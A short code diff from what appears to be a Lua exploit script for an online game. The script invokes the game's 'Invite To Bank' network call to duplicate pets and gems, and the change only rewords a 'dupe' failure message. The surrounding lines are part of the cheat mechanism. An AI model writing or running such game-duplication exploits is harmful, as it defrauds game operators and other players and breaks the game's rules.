@@ -31,5 +31,5 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
 	lib.Message.New("Please do not rejoin the game in the next 10-15 minutes or you may lose the pet(s) and gems. If your pets and gems aren't in the bank, quickly add them.");
 else
 	lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber)
-    lib.Message.New("Dupe Error - bank is not tier 2+. If it is, please rejoin the game and try again.");
+    lib.Message.New("Duplication Failed :( - your bank is not tier 2 or above. once you have got it to tier 2+ rejoin and retry. :) .");
 end;
